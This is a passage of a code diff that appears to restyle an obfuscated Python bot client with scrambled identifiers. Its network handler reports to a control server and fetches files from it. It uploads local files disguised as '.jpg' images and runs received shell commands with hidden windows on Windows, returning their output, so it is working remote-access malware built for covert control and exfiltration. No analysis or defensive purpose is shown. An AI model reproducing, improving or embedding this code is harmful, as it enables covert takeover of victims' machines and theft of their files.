 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__send_request(id=botKlass.bot_id,action='answer',task_id=taskID,data=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDz[i],current=i,total=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDy)
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
 					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('result','')=='ok':
 						botKlass.is_first_request=False
 						break
 				except ExceptionKlass:
-					pass
 					time_sleep(random_randint(3,8))
 					continue
-				except(urllib2_httperror,ValueError)as err:
-					pass
+				except (urllib2_httperror,ValueError) as err:
 					time_sleep(3)
 		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
 
 
 	def download_file(self,url_file_name,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		for i in range(3):
-			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('checksum',None)
+		for _ in range(3):
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy = (
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('checksum')
+			)
+
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=self.__send_request(id=botKlass.bot_id,action='download',file=url_file_name)
 			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDze=binascii_crc32(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)&0xffffff
-				if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDze==int(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy):
+				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDze != int(
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy
+				):
 					try:
 						self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
 					except ExceptionKlass:
@@ -1556,18 +1606,20 @@ class NetworkHandlerKlass(object):
 
 
 	def upload_file(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi):
-		for i in range(3):
+		for _ in range(3):
 			with open(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi,'rb')as fl:
 				try:
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDyz=os_fstat(fl.fileno()).st_size
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi=HttpFormatKlass()
 					encoded_cookie_data=self.__encode_cookie({'id':botKlass.bot_id,'action':'upload'})
-					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.add_file(str('image'),str(id_generator()+'.jpg'),fl)
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.add_file(
+						'image', str(f'{id_generator()}.jpg'), fl
+					)
+
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie={}
 					if botKlass.current_transport=='wininet':
 						http_klass=HttpKlass(self.url,self.user_agent)
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=http_klass.post_form(encoded_cookie_data,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
-						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
 					else:
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei=str(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez=urllib2_request(str(self.url))
@@ -1577,18 +1629,17 @@ class NetworkHandlerKlass(object):
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_header('Content-length',len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez.add_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei)
 						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=urllib2_urlopen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDez).read()
-						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
+					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
 					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('result','')!='ok' or pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('size',0)!=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDyz:
 						raise ValueError
 					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie['url']=self.url
 					return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
 				except ExceptionKlass:
 					time_sleep(random_randint(3,8))
-					continue
 
 
 	def get_ip(self):
-		for i in range(3):
+		for _ in range(3):
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__send_request(id=botKlass.bot_id,action='getip')
 			try:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
@@ -1629,23 +1680,27 @@ class HandleCommandKlass(object):
 
 	@staticmethod
 	def invoke_command(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
-		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzei=0x00000008
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDziy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('wait',True)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzie=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('visible',False)
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze=None
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi=None
 		if v_sys_platform=='win32':
+			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzei=0x00000008
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzei
 			if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDzie:
 				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze=v_startup_info
 		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDziy:
 			p=subprocess_popen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,shell=True,stderr=subprocess_pipe,stdout=subprocess_pipe,stdin=subprocess_pipe,startupinfo=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze)
 			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyez,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyei=p.communicate()
-			v_return_message=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyez+'\n'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyei
+			return (
+				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyez
+				+ '\n'
+				+ pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyei
+			)
+
 		else:
 			p=subprocess_popen(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,shell=False,stderr=None,stdout=None,stdin=None,close_fds=True,creationflags=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyzi,startupinfo=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDyze)
-			v_return_message="Process started with PID: {0}".format(p.pid)
-		return v_return_message
+			return "Process started with PID: {0}".format(p.pid)
 
 
 	@staticmethod
@@ -1653,9 +1708,8 @@ class HandleCommandKlass(object):
 		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=os_path.abspath(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
 		if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
 			return False
-		else:
-			botKlass.current_dir=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
-			return True
+		botKlass.current_dir=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy
+		return True
 
 
 	def __special_process(self,v_bot_command,v_optional):
